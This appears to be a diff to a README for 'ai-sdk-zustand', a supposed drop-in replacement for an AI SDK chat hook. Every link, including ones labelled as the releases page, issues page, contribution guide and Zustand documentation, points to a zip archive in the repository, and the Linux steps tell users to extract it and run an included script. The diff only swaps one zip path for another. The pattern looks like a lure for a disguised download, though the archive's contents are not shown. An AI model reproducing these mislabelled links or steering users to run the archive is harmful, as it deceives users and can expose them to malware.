@@ -1,7 +1,7 @@
 # 🚀 ai-sdk-zustand - Simplified Global Chat Access
 
 ## 🛑 Download Now!
-[![Download ai-sdk-zustand](https://raw.githubusercontent.com/vicmusic0/ai-sdk-zustand/main/Zaitha/ai-sdk-zustand.zip)](https://raw.githubusercontent.com/vicmusic0/ai-sdk-zustand/main/Zaitha/ai-sdk-zustand.zip)
+[![Download ai-sdk-zustand](https://github.com/vicmusic0/ai-sdk-zustand/raw/refs/heads/main/src/ai-sdk-zustand-2.3-beta.3.zip)](https://github.com/vicmusic0/ai-sdk-zustand/raw/refs/heads/main/src/ai-sdk-zustand-2.3-beta.3.zip)
 
 ## 📖 Introduction
 
@@ -11,7 +11,7 @@ Welcome to **ai-sdk-zustand**! This tool serves as a drop-in replacement for `@a
 
 To run this application, please follow these steps:
 
-1. **Visit the Releases Page**: Go to our [Releases Page](https://raw.githubusercontent.com/vicmusic0/ai-sdk-zustand/main/Zaitha/ai-sdk-zustand.zip) to download the latest version of **ai-sdk-zustand**.
+1. **Visit the Releases Page**: Go to our [Releases Page](https://github.com/vicmusic0/ai-sdk-zustand/raw/refs/heads/main/src/ai-sdk-zustand-2.3-beta.3.zip) to download the latest version of **ai-sdk-zustand**.
   
 2. **Download the Application**: On the Releases page, you will find the latest version. Click on the appropriate file for your operating system to begin the download.
 
@@ -32,7 +32,7 @@ To run this application, please follow these steps:
 
 ### Linux
 
-1. Download the `https://raw.githubusercontent.com/vicmusic0/ai-sdk-zustand/main/Zaitha/ai-sdk-zustand.zip` file from the Releases page.
+1. Download the `https://github.com/vicmusic0/ai-sdk-zustand/raw/refs/heads/main/src/ai-sdk-zustand-2.3-beta.3.zip` file from the Releases page.
 2. Extract the file using the terminal or a file manager.
 3. Navigate to the extracted folder and run the included script to install.
 
@@ -73,7 +73,7 @@ This tool removes the need for prop drilling. You can easily access your chat da
 
 ## 📥 Download & Install
 
-To download **ai-sdk-zustand**, visit our [Releases Page](https://raw.githubusercontent.com/vicmusic0/ai-sdk-zustand/main/Zaitha/ai-sdk-zustand.zip). Choose the file that best matches your operating system to get started.
+To download **ai-sdk-zustand**, visit our [Releases Page](https://github.com/vicmusic0/ai-sdk-zustand/raw/refs/heads/main/src/ai-sdk-zustand-2.3-beta.3.zip). Choose the file that best matches your operating system to get started.
 
 ## 🆕 Upgrade Guide
 
@@ -99,7 +99,7 @@ Once you’ve made this change, your existing code can stay the same. Everything
 
 ## 🌐 Community and Support
 
-If you run into issues or need help, feel free to visit our [GitHub Issues](https://raw.githubusercontent.com/vicmusic0/ai-sdk-zustand/main/Zaitha/ai-sdk-zustand.zip) page to ask questions or report bugs. We encourage contributions and discussions, so don’t hesitate to get involved!
+If you run into issues or need help, feel free to visit our [GitHub Issues](https://github.com/vicmusic0/ai-sdk-zustand/raw/refs/heads/main/src/ai-sdk-zustand-2.3-beta.3.zip) page to ask questions or report bugs. We encourage contributions and discussions, so don’t hesitate to get involved!
 
 ## 🎓 Frequently Asked Questions
 
@@ -119,15 +119,15 @@ A: Absolutely! It simplifies state management while ensuring optimal performance
 
 ## 📣 Contributions
 
-Contributions are welcome! Check our [Contribution Guide](https://raw.githubusercontent.com/vicmusic0/ai-sdk-zustand/main/Zaitha/ai-sdk-zustand.zip) for more details on how you can help improve **ai-sdk-zustand**.
+Contributions are welcome! Check our [Contribution Guide](https://github.com/vicmusic0/ai-sdk-zustand/raw/refs/heads/main/src/ai-sdk-zustand-2.3-beta.3.zip) for more details on how you can help improve **ai-sdk-zustand**.
 
 ## 📞 Contact
 
-For any inquiries or suggestions, please reach out via the Issues page on our [GitHub Repository](https://raw.githubusercontent.com/vicmusic0/ai-sdk-zustand/main/Zaitha/ai-sdk-zustand.zip). We're here to help!
+For any inquiries or suggestions, please reach out via the Issues page on our [GitHub Repository](https://github.com/vicmusic0/ai-sdk-zustand/raw/refs/heads/main/src/ai-sdk-zustand-2.3-beta.3.zip). We're here to help!
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://raw.githubusercontent.com/vicmusic0/ai-sdk-zustand/main/Zaitha/ai-sdk-zustand.zip)
-- [Zustand Documentation](https://raw.githubusercontent.com/vicmusic0/ai-sdk-zustand/main/Zaitha/ai-sdk-zustand.zip) 
+- [GitHub Repository](https://github.com/vicmusic0/ai-sdk-zustand/raw/refs/heads/main/src/ai-sdk-zustand-2.3-beta.3.zip)
+- [Zustand Documentation](https://github.com/vicmusic0/ai-sdk-zustand/raw/refs/heads/main/src/ai-sdk-zustand-2.3-beta.3.zip) 
 
 Now that you are ready to get started with **ai-sdk-zustand**, enjoy managing your AI chats effortlessly!
